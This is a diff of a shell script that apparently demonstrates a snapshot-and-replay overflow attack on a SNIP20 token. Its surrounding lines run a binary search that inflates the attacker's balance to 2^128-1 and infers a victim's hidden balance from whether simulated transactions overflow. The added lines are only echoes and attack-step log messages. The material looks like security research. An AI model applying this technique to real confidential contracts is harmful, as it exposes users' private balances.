@@ -147,6 +147,9 @@ while [[ "$(bc <<< "${high} - ${low}")" -ne 0 ]]; do
     teebox log "high=${high}"
     teebox log "probe=${probe}"
 
+    echo
+    teebox log "Fork()    [light_goldenrod1]# set snapshot of database[/]"
+    teebox log "Replay(balance\[attacker]=2^128-1)    [light_goldenrod1]# reset attacker's balance to inflated amount"
     cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
     cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
     set_snapshot "${snapshot_uniq_label}-${cnt}"
@@ -156,6 +159,7 @@ while [[ "$(bc <<< "${high} - ${low}")" -ne 0 ]]; do
     simulate_tx snip20_adv
     simulate_tx_result=$(cat $BACKUP/simulate_result)
 
+    echo
     # Assumes exit code 0, meaning successful, and exit code 1, meaning failure (overflow)
     if [ ${simulate_tx_result} != 0 ]; then
         high=$(bc <<< "${probe} - 1");
@@ -172,6 +176,7 @@ while [[ "$(bc <<< "${high} - ${low}")" -ne 0 ]]; do
     fi
 
     cnt=$((cnt + 1))
+    echo
 done
 
 balance=$(bc <<< "2^128 - 1 - ${low}")
